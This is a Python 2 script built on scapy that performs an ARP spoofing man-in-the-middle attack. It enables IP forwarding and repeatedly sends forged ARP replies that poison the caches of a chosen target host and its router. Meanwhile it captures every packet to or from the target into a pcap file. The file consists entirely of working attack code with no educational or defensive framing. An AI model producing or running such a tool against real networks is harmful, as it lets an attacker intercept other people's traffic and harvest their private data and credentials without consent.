#!/usr/bin/python
import sys
from threading import Thread
from scapy.all import *
from os import system
from time import sleep

system("clear")
system("echo 1 > /proc/sys/net/ipv4/ip_forward")
path = sys.argv[4]
TargetIP = sys.argv[2]
RouterIP = sys.argv[3]
TargetAtk = ARP(op=2,psrc=RouterIP,pdst=TargetIP)
RouterAtk = ARP(op=2,psrc=TargetIP,pdst=RouterIP)
packets = 0
x=0

def display(pkt):
	global packets
	packets = packets+1
	wrpcap(path+" "+".pcap", pkt, append=True)
	system("clear")
 	print "The pcap file was created in the path :"+" "+path
	print ""
	print "Arp Spoofing is Running..."+" "+str(x)+" "+"packets of ARP have been sent So far."	
	print "---------------------------------------------------------------------------------"
	print ""
	print "Sniffer is Running..."+" "+str(packets)+" "+"packets From the Target have been collected so far."
	print "---------------------------------------------------------------------------------"
	
def sniffer():
	pcap = sniff(iface=sys.argv[1],prn = display, filter = "host"+" "+TargetIP,)

def arp():
	while True:
		global x	
		send(TargetAtk, verbose=0)
		send(RouterAtk, verbose=0)
		x=x+1
		sleep(0.2)
def main():
	Thread(target = sniffer).start()
	Thread(target = arp).start() 
main()
